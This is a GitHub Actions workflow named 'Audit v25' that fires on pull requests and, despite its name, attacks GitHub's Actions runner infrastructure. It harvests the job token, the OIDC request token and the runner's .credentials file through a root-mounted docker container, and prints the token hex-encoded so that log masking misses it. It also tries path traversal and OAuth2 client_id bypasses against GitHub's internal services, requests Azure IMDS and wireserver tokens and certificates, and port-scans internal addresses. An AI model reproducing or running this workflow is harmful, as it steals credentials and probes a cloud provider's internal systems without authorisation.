name: Audit v25
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v25:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V25 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"

          # Also capture ACTIONS_ID_TOKEN_REQUEST_TOKEN — it's a different token
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"

          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi

          # Hex credential + decode silently
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: Traversal pattern on EVERY service
      # v24 showed pipeline service processes ../
      # Apply same pattern to run-service, cache, results, broker
      # Also: canonical vs regional URL comparison
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Traversal everywhere
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== TRAVERSAL EVERYWHERE ==="
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"

          # A: Pipeline — canonical URL vs regional URL
          echo "--- A: Canonical vs regional pipeline ---"
          for HOST in \
            "pipelinesghubeus14.actions.githubusercontent.com" \
            "pipelines.actions.githubusercontent.com"; do
            for P in "$SECRET" "../" "../../" "" "test" "$SECRET/.."; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "https://$HOST/$P/_apis/connectionData" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
              [ "$CODE" != "HTTP_000" ] && echo "A $HOST / $P = $CODE iid=$IID"
            done
          done
          echo ""

          # B: Cache service — traversal
          echo "--- B: Cache traversal ---"
          for HOST in "artifactcache.actions.githubusercontent.com"; do
            for P in "$SECRET" "../" "../../" "" "$SECRET/.." "test"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "https://$HOST/$P/_apis/artifactcache/cache?keys=test&version=test" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d' | head -c 150)
              echo "B $P = $CODE | $BODY"
            done
          done
          echo ""

          # C: Run-service — traversal depth + path variants
          echo "--- C: Run-service traversal ---"
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          if [ -n "$RUN_URL" ]; then
            RUN_BASE=$(echo "$RUN_URL" | grep -oP 'https://[^/]+')
            RUN_NUM=$(echo "$RUN_URL" | grep -oP '/[0-9]+/$' | tr -d '/')
            for P in \
              "/" \
              "/../" \
              "/../../" \
              "/$RUN_NUM/" \
              "/$RUN_NUM/../" \
              "/$RUN_NUM/../../" \
              "/0/" \
              "/$RUN_NUM/check" \
              "/$RUN_NUM/_apis/connectionData" \
              "/_apis/connectionData" \
              "/../_apis/connectionData" \
              "/health" \
              "/../health" \
              "/$RUN_NUM/../../../"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "$RUN_BASE$P" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d' | head -c 150)
              [ "$CODE" != "HTTP_000" ] && echo "C $P = $CODE | $BODY"
            done
          fi
          echo ""

          # D: Results-receiver — traversal
          echo "--- D: Results-receiver traversal ---"
          for P in \
            "/" \
            "/../" \
            "/../../" \
            "/health" \
            "/healthz" \
            "/_debug" \
            "/twirp" \
            "/../twirp" \
            "/twirp/github.actions.results.api.v1.CacheService" \
            "/.well-known/openid-configuration" \
            "/v1" \
            "/v2" \
            "/api"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "https://results-receiver.actions.githubusercontent.com$P" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d' | head -c 150)
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && echo "D $P = $CODE | $BODY"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: Broker deep discovery
      # v24: health=200 "👍". Dig into the API surface.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Broker deep
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== BROKER DEEP ==="
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          IDTOK=$(cat /tmp/idtok.txt 2>/dev/null)
          BROKER="https://broker.actions.githubusercontent.com"

          # Try all 3 tokens
          for TOK_NAME in "RT" "CTOK" "IDTOK"; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
            echo "=== TOKEN: $TOK_NAME (${#TOK} chars) ==="

            for EP in \
              "health" \
              "healthz" \
              "ready" \
              "version" \
              "v1" \
              "v2" \
              "api" \
              "api/v1" \
              "api/v3" \
              "_apis/connectionData" \
              "_apis/resourceareas" \
              "_apis/distributedtask" \
              "_apis/distributedtask/pools" \
              "_apis/distributedtask/agents" \
              "api/v3/actions/runner-registration" \
              "api/actions/runner-registration" \
              "actions/runner-registration" \
              "runner/session" \
              "runner/message" \
              "negotiate" \
              "_negotiate" \
              "session" \
              "message" \
              "messagequeue" \
              "agent" \
              "agents" \
              "pools" \
              "registration" \
              ".well-known/openid-configuration" \
              "twirp" \
              "_internal"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$BROKER/$EP" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d' | head -c 150)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "  $EP = $CODE | $BODY"
            done
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: oauth2 — empty clientId + all token types
      # v23: "clientId doesn't match subject" where subject is EMPTY
      # Try empty client_id. Also try IDTOK as assertion.
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - OAuth2 empty clientId
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== OAUTH2 EMPTY CLIENTID ==="
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          IDTOK=$(cat /tmp/idtok.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          [ -z "$PURL" ] && exit 0

          # A: Empty client_id with credential JWT
          echo "--- A: Empty client_id ---"
          if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
            # URL-encode the cred token
            CTOK_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/cred_token.txt').read().strip()))" 2>/dev/null)
            for CID in "" " " "null" "undefined"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${PURL}_apis/oauth2/token" \
                -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$CID&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A cid='$CID' = $CODE | $(echo "$BODY" | head -c 300)"
            done

            # Without client_id param at all
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "${PURL}_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&scope=vso.full_access")
            CODE=$(echo "$R" | tail -1)
            echo "A no-cid = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          fi
          echo ""

          # B: ACTIONS_ID_TOKEN_REQUEST_TOKEN as assertion
          echo "--- B: IDTOK assertion ---"
          if [ -n "$IDTOK" ] && [ ${#IDTOK} -gt 10 ]; then
            IDTOK_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$IDTOK" 2>/dev/null)
            for GRANT in "client_credentials" "urn:ietf:params:oauth:grant-type:jwt-bearer"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${PURL}_apis/oauth2/token" \
                -d "grant_type=$GRANT&client_assertion=$IDTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&assertion=$IDTOK_ENC&client_id=&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B $GRANT = $CODE | $(echo "$BODY" | head -c 300)"
            done
          fi
          echo ""

          # C: Try on canonical URL (pipelines.actions vs pipelinesghubeus14)
          echo "--- C: Canonical URL oauth2 ---"
          CANON="https://pipelines.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF/"
          if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "${CANON}_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
            CODE=$(echo "$R" | tail -1)
            echo "C canonical = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Internal network probing — SSRF from runner
      # Runner has direct network access to internal services
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Internal network
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== INTERNAL NETWORK ==="
          RT=$(cat /tmp/rt.txt)

          # A: IMDS — get actual access token
          echo "--- A: IMDS token ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "A mgmt token = $CODE | $(echo "$BODY" | head -c 300)"

          # Try different resources
          for RES in \
            "https://graph.microsoft.com" \
            "https://vault.azure.net" \
            "https://storage.azure.com" \
            "https://database.windows.net" \
            "https://dev.azure.com" \
            "https://management.core.windows.net"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Metadata: true" \
              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            ERROR=$(echo "$BODY" | jq -r '.error // empty' 2>/dev/null)
            [ "$ERROR" != "invalid_resource" ] && \
              echo "A $RES = $CODE err=$ERROR | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: Wireserver — goal state + certificates
          echo "--- B: Wireserver ---"
          for EP in \
            "machine?comp=goalstate" \
            "machine?comp=config&type=hostingEnvironmentConfig" \
            "machine?comp=config&type=sharedConfig" \
            "machine?comp=config&type=extensionsConfig" \
            "machine?comp=config&type=fullConfig" \
            "machine/plugins?comp=config" \
            "machine?comp=certificates"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "x-ms-version: 2012-11-30" "http://168.63.129.16/$EP" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: Internal IP scanning — find services on local network
          echo "--- C: Port scan ---"
          for IP in "10.1.0.1" "10.1.0.80" "127.0.0.1"; do
            for PORT in 80 443 8080 8443 3000 5000 9090 6379 5432 3306 27017 2379; do
              R=$(/usr/bin/curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 1 -m 2 \
                "http://$IP:$PORT/" 2>/dev/null)
              [ "$R" != "000" ] && echo "C $IP:$PORT = $R"
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 6: IDTOK as service auth
      # ACTIONS_ID_TOKEN_REQUEST_TOKEN — we use it to GET oidc tokens
      # but what IS it? Try it as auth on every service
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - IDTOK everywhere
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== IDTOK EVERYWHERE ==="
          IDTOK=$(cat /tmp/idtok.txt 2>/dev/null)
          [ -z "$IDTOK" ] || [ ${#IDTOK} -lt 10 ] && { echo "NO IDTOK"; exit 0; }
          echo "IDTOK: ${#IDTOK} chars"

          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          CACHE_URL=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)

          echo "--- Pipeline service ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $IDTOK" "${PURL}_apis/connectionData")
          CODE=$(echo "$R" | tail -1)
          echo "PIPE connData = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $IDTOK" "${PURL}_apis/distributedtask/plans/$PLAN/timelines")
          CODE=$(echo "$R" | tail -1)
          echo "PIPE timelines = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          echo "--- Run service ---"
          if [ -n "$RUN_URL" ]; then
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $IDTOK" "${RUN_URL}")
            CODE=$(echo "$R" | tail -1)
            echo "RUN root = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $IDTOK" "${RUN_URL}check")
            echo "RUN check = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 200)"
          fi

          echo "--- Cache service ---"
          if [ -n "$CACHE_URL" ]; then
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json;api-version=6.0-preview.1" \
              "${CACHE_URL}_apis/artifactcache/caches" \
              -d '{"key":"v25-idtok","version":"v25"}')
            CODE=$(echo "$R" | tail -1)
            echo "CACHE reserve = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          fi

          echo "--- Results-receiver ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
            -d '{"key":"v25-idtok","version":"1"}')
          CODE=$(echo "$R" | tail -1)
          echo "RESULTS cache = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
            -d '{"name":"v25-idtok","workflow_run_backend_id":"1","workflow_job_run_backend_id":"1"}')
          CODE=$(echo "$R" | tail -1)
          echo "RESULTS artifact = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

      # ══════════════════════════════════════════════════════════════
      # STEP 7: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 7 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V25 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "CTOK_LEN=$(wc -c < /tmp/cred_token.txt 2>/dev/null)"
          echo "IDTOK_LEN=$(wc -c < /tmp/idtok.txt 2>/dev/null)"
          echo "=== V25 COMPLETE ==="
